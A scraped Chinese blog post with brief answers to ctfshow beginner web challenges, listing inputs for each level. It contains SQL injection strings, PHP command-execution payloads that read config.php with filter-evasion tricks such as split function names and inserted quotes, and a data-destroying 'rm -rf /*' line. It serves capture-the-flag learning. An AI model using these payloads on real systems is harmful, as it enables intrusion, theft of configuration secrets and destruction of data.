<!--yml
category: 未分类
date: 2022-04-26 14:31:17
-->

# ctfshow 萌新web题解_Mr_小白先生的博客-CSDN博客

> 来源：[https://blog.csdn.net/qq_41788704/article/details/108973075](https://blog.csdn.net/qq_41788704/article/details/108973075)

# web1

```
十六进制	0x38e 
```

# web2

```
异或 200^800
按位与 992|8 
```

# web3

```
加减乘除都可以
--1000  负负得正 
```

# web4

```
id=1 or 1=1#
id=id#
上面是显示所有的数据，flag自然也会在里面
‘1000’  MySQL会自动转换类型 
```

# web5

```
异或 144^888 
```

# web6

```
取反 ~~1000 
```

# web7

```
二进制 0b1111101000 
```

# web8

```
rm -rf /*
删库跑路？？ 
```

# web9

```
可以直接执行命令
system('cat config.php'); 
```

# web10

```
用其他的函数就可以  passthru('cat config.php');
拼接system  $a='sys';$b='tem';$c=$a.$b;$c('cat config'); 
```

# web11

```
拼接  $a='c';$b='at';$c=$a.$b;passthru("$c config.php");
单双引号  passthru("ca''t config.php"); 
```